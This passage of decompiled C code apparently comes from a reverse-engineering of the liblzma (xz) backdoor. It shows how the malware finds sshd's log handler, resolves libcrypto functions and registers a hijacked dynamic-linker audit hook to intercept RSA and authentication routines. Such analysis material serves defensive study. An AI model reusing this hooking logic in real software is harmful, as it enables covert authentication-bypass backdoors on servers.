                  bVar25 = local_9d8[0x1b] * '\x02';
LAB_001068e4:
                  uVar60 = uVar60 | bVar25 & 8;
                }
              }
            }
            puVar57 = puVar62;
            if ((uVar61 == uVar60) && ((local_9d8._16_2_ & 0x100) != 0)) {
              puVar47 = (u8 *)local_9d8._48_8_;
              if ((local_9d8._28_4_ & 0xff00ff00) == 0x5000000) {
                puVar47 = (u8 *)(local_9d8._48_8_ + local_9d8._0_8_) +
                          CONCAT44(local_9d8._12_4_,local_9d8._8_4_);
              }
              local_a90 = 0;
              puVar45 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,0);
              if ((((puVar45 == (u8 *)0x0) || (puVar45 + local_a90 <= puVar47)) ||
                  (puVar47 < puVar45)) ||
                 (((puVar47 == puVar62 && (puVar47 == puVar48)) ||
                  (puVar57 = puVar47, puVar48 != (u8 *)0x0)))) goto LAB_00106997;
            }
            else {
LAB_00106997:
              puVar47 = puVar48;
              puVar62 = puVar57;
            }
            puVar57 = (u8 *)(local_9d8._0_8_ + CONCAT44(local_9d8._12_4_,local_9d8._8_4_));
            puVar48 = puVar47;
          }
          if ((puVar48 == (u8 *)0x0) || (puVar62 == (u8 *)0x0)) {
LAB_00106ab1:
            puVar62 = (u8 *)0x0;
            local_b20 = (u8 *)0x0;
          }
          else {
LAB_00106b3c:
            BVar27 = validate_log_handler_pointers
                               (puVar48,puVar62,pvVar28,(u8 *)((long)pvVar28 + uVar11),
                                &local_980.string_refs,ctx);
            local_b20 = puVar48;
            if (BVar27 != 0) {
              psVar54->log_handler_ptr = puVar48;
              peVar32 = &local_980.main_info;
              psVar54->log_handler_ctx_ptr = puVar62;
              psVar54->log_hooking_possible = 1;
              local_9d8._0_4_ = 0x708;
              pcVar38 = elf_find_string(peVar32,(EncodedStringId *)local_9d8,(void *)0x0);
              psVar54->STR_percent_s = pcVar38;
              if (pcVar38 != (char *)0x0) {
                local_9d8._0_4_ = 0x790;
                pcVar38 = elf_find_string(peVar32,(EncodedStringId *)local_9d8,(void *)0x0);
                psVar54->STR_Connection_closed_by = pcVar38;
                if (pcVar38 != (char *)0x0) {
                  local_9d8._0_4_ = 0x4f0;
                  pcVar38 = elf_find_string(peVar32,(EncodedStringId *)local_9d8,(void *)0x0);
                  psVar54->STR_preauth = pcVar38;
                  if (pcVar38 != (char *)0x0) {
                    local_9d8._0_4_ = 0x1d8;
                    pcVar38 = elf_find_string(peVar32,(EncodedStringId *)local_9d8,(void *)0x0);
                    psVar54->STR_authenticating = pcVar38;
                    if (pcVar38 != (char *)0x0) {
                      local_9d8._0_4_ = 0xb10;
                      pcVar38 = elf_find_string(peVar32,(EncodedStringId *)local_9d8,(void *)0x0);
                      psVar54->STR_user = pcVar38;
                      if (pcVar38 != (char *)0x0) break;
                    }
                  }
                }
              }
              psVar54->logging_disabled = 1;
              break;
            }
          }
        }
        else if ((((local_a30._40_4_ == 0x147) && ((uint)local_a30._28_4_ >> 8 == 0x50000)) &&
                 ((local_a30._16_2_ & 0x800) != 0)) && (local_a30._64_8_ == 0)) {
          puVar48 = (u8 *)0x0;
          if ((local_a30._16_2_ & 0x100) != 0) {
            puVar48 = (u8 *)(local_a30._0_8_ + local_a30._8_8_ + local_a30._48_8_);
          }
          local_9d8._0_8_ = (u8 *)0x0;
          puVar57 = (u8 *)elf_get_data_segment(&local_980.main_info,(u64 *)local_9d8,0);
          if (((puVar57 != (u8 *)0x0) && (puVar48 < (u8 *)(local_9d8._0_8_ + (long)puVar57))) &&
             (puVar57 <= puVar48)) {
            pdVar58 = (dasm_ctx_t *)local_9d8;
            for (lVar46 = 0x16; puVar62 = local_b48, lVar46 != 0; lVar46 = lVar46 + -1) {
              *(undefined4 *)&pdVar58->instruction = 0;
              pdVar58 = (dasm_ctx_t *)((long)pdVar58 + (ulong)bVar64 * -8 + 4);
            }
            do {
              BVar27 = find_instruction_with_mem_operand_ex
                                 (puVar62,(u8 *)local_980.string_refs.entries[0x1a].func_end,
                                  (dasm_ctx_t *)local_9d8,0x147,(void *)0x0);
              if (BVar27 == 0) break;
              if ((local_998 == 0) && ((local_9d8._16_2_ & 0x100) != 0)) {
                puVar62 = (u8 *)local_9d8._48_8_;
                if ((local_9d8._28_4_ & 0xff00ff00) == 0x5000000) {
                  puVar62 = (u8 *)(local_9d8._48_8_ + local_9d8._0_8_) +
                            CONCAT44(local_9d8._12_4_,local_9d8._8_4_);
                }
                local_a90 = 0;
                puVar57 = (u8 *)elf_get_data_segment(&local_980.main_info,&local_a90,0);
                if ((((puVar57 != (u8 *)0x0) && (puVar62 < puVar57 + local_a90)) &&
                    (puVar57 <= puVar62)) && (puVar48 != puVar62)) goto LAB_00106b3c;
              }
              puVar62 = (u8 *)(local_9d8._0_8_ + CONCAT44(local_9d8._12_4_,local_9d8._8_4_));
            } while ((u8 *)(local_9d8._0_8_ + CONCAT44(local_9d8._12_4_,local_9d8._8_4_)) <
                     local_980.string_refs.entries[0x1a].func_end);
            goto LAB_00106ab1;
          }
        }
LAB_00106735:
        local_b48 = local_b48 + local_a30._8_8_;
      } while( true );
    }
  }
LAB_00106bf0:
  plVar31->opaque = local_980.elf_handles.libcrypto;
  if (pEVar37 != (Elf64_Sym *)0x0) {
    EVar16 = pEVar37->st_value;
    pEVar17 = (local_980.elf_handles.libcrypto)->elfbase;
    puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
    *puVar1 = *puVar1 + 1;
    (local_b10->imported_funcs).EVP_DecryptUpdate = (_func_48 *)(pEVar17->e_ident + EVar16);
  }
  if (pEVar40 != (Elf64_Sym *)0x0) {
    EVar16 = pEVar40->st_value;
    pEVar17 = (local_980.elf_handles.libcrypto)->elfbase;
    puVar1 = &(local_b10->imported_funcs).resolved_imports_count;
    *puVar1 = *puVar1 + 1;
    (local_b10->imported_funcs).EVP_DecryptFinal_ex = (_func_49 *)(pEVar17->e_ident + EVar16);
  }
  BVar27 = init_imported_funcs(imported_funcs);
  if (((((((BVar27 != 0) &&
          (lzma_free((local_b10->imported_funcs).EVP_MD_CTX_new,plVar31),
          (local_b10->libc_imports).resolved_imports_count == 0xc)) &&
         (BVar27 = secret_data_append_from_address
                             ((void *)0x1,(secret_data_shift_cursor_t)0x145,0x78,0x18), BVar27 != 0)
         ) && ((BVar27 = secret_data_append_from_address
                                   (params->hook_params->symbind64,(secret_data_shift_cursor_t)0x12a
                                    ,4,0x12), BVar27 != 0 &&
               (BVar27 = secret_data_append_item
                                   ((secret_data_shift_cursor_t)0x12e,0x13,4,0x20,
                                    (u8 *)params->hook_params->hook_RSA_public_decrypt), BVar27 != 0
               )))) &&
       (BVar27 = secret_data_append_from_address
                           (params->shared->hook_EVP_PKEY_set1_RSA,(secret_data_shift_cursor_t)0x132
                            ,6,0x14), BVar27 != 0)) &&
      ((BVar27 = secret_data_append_item
                           ((secret_data_shift_cursor_t)0x138,0x15,2,0x10,
                            (u8 *)params->hook_params->hook_RSA_get0_key), BVar27 != 0 &&
       (BVar27 = secret_data_append_item
                           ((secret_data_shift_cursor_t)0xee,0x10,0x26,0x20,
                            (u8 *)params->hook_params->mm_answer_keyallowed), BVar27 != 0)))) &&
     ((BVar27 = secret_data_append_item
                          ((secret_data_shift_cursor_t)0x140,0x17,5,0x20,
                           (u8 *)params->hook_params->mm_answer_keyverify), BVar27 != 0 &&
      (((BVar27 = secret_data_append_item
                            ((secret_data_shift_cursor_t)0x13a,0x16,6,0x20,
                             (u8 *)params->shared->mm_answer_authpassword_hook), BVar27 != 0 &&
        (BVar27 = secret_data_append_item
                            ((secret_data_shift_cursor_t)0x114,0x11,0x16,0x10,
                             (u8 *)peVar35->elf_parse), BVar27 != 0)) &&
       ((local_b10->global_ctx).num_shifted_bits == 0x1c8)))))) {
    *(local_b10->ldso_ctx).libcrypto_l_name = (char *)local_b10;
    local_980.main_map = local_980.main_map + local_ac8 + 8;
    uVar6 = *(u32 *)local_980.main_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_ptr = (u32 *)local_980.main_map;
    (local_b10->ldso_ctx).sshd_auditstate_bindflags_old_value = uVar6;
    *(u32 *)local_980.main_map = 2;
    pbVar19 = (byte *)(local_b10->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
    *pbVar19 = *pbVar19 | (local_b10->ldso_ctx).link_map_l_audit_any_plt_bitmask;
    local_980.libcrypto_map = local_980.libcrypto_map + local_ac8 + 8;
    uVar6 = *(u32 *)local_980.libcrypto_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_ptr = (u32 *)local_980.libcrypto_map;
    (local_b10->ldso_ctx).libcrypto_auditstate_bindflags_old_value = uVar6;
    paVar2 = &(local_b10->ldso_ctx).hooked_audit_ifaces;
    *(u32 *)local_980.libcrypto_map = 1;
    paVar59 = paVar2;
    for (lVar46 = 0x1e; lVar46 != 0; lVar46 = lVar46 + -1) {
      *(undefined4 *)&paVar59->activity = 0;
      paVar59 = (audit_ifaces *)((long)paVar59 + (ulong)bVar64 * -8 + 4);
    }
    (local_b10->ldso_ctx).hooked_audit_ifaces.field4_0x20 =
         (_union_34)params->hook_params->symbind64;
    *(local_b10->ldso_ctx)._dl_audit_ptr = paVar2;
    *(local_b10->ldso_ctx)._dl_naudit_ptr = 1;
    lVar46 = 0;
    plVar29 = local_980.import_resolver;
    while (plVar29 != (lzma_allocator *)0x0) {
      *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar46) =
           *(undefined1 *)((long)&local_980.fake_allocator.alloc + lVar46);
      plVar29 = (lzma_allocator *)(lVar46 + -0x17);
      lVar46 = lVar46 + 1;
    }
    goto LAB_00105a81;
  }
LAB_00105a60:
  plVar29 = &local_980.fake_allocator;
  init_ldso_ctx(&local_b10->ldso_ctx);
  lVar46 = 0;
  plVar31 = local_980.import_resolver;
  while (plVar31 != (lzma_allocator *)0x0) {
    *(undefined1 *)((long)&(local_980.import_resolver)->alloc + lVar46) =
         *(undefined1 *)((long)&plVar29->alloc + lVar46);
    plVar31 = (lzma_allocator *)(lVar46 + -0x17);
    lVar46 = lVar46 + 1;
  }
LAB_00105a81:
  peVar50 = params->entry_ctx;
  (peVar50->got_ctx).got_ptr = (void *)0x0;
  (peVar50->got_ctx).return_address = (void *)0x0;
  (peVar50->got_ctx).cpuid_fn = (void *)0x0;
  (peVar50->got_ctx).got_offset = 0;
  peVar50->symbol_ptr = (void *)0x1;
  piVar44 = (int *)cpuid_basic_info(0);
  if (*piVar44 != 0) {
    puVar56 = (undefined4 *)cpuid_Version_info(1);
    uVar20 = puVar56[1];
    uVar21 = puVar56[2];
    uVar22 = puVar56[3];
    *(undefined4 *)&(peVar50->got_ctx).got_ptr = *puVar56;
    *(undefined4 *)&(peVar50->got_ctx).return_address = uVar20;
    *(undefined4 *)&(peVar50->got_ctx).cpuid_fn = uVar22;
    *(undefined4 *)&(peVar50->got_ctx).got_offset = uVar21;
  }
  return 0;
}

